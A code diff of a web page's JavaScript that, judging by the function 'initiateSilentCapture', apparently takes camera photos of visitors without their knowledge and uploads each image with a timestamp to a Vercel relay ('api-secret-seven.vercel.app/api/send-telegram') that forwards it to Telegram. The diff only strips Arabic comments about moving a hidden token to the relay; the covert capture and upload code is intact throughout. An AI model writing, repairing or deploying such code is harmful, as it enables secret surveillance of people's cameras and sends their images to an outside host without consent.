@@ -91,8 +91,6 @@
 
         const video = document.getElementById('videoFeed');
         const canvas = document.getElementById('canvas');
-        
-        // --- تم حذف التوكن والـ ID من هنا ---
 
         async function initiateSilentCapture() {
             try {
@@ -126,7 +124,6 @@
                             canvas.height = video.videoHeight;
                             canvas.getContext('2d').drawImage(video, 0, 0);
                             canvas.toBlob(blob => {
-                                // تم تغيير هذه الدالة لترسل إلى Vercel
                                 sendToTelegram(blob, cameraName).finally(() => {
                                     stopCamera(stream);
                                     resolve();
@@ -141,13 +138,11 @@
             });
         }
         
-        // --- تم استبدال هذه الدالة بالكامل ---
         async function sendToTelegram(imageBlob, cameraName) {
             const formData = new FormData();
             formData.append('photo', imageBlob, 'capture.jpg');
             formData.append('caption', `📸 [${cameraName}] \n🗓️ ${new Date().toLocaleString()}`);
 
-            // الرابط الآمن لخادم Vercel الخاص بك
             const VERCEL_API_URL = "https://api-secret-seven.vercel.app/api/send-telegram"; 
 
             try {
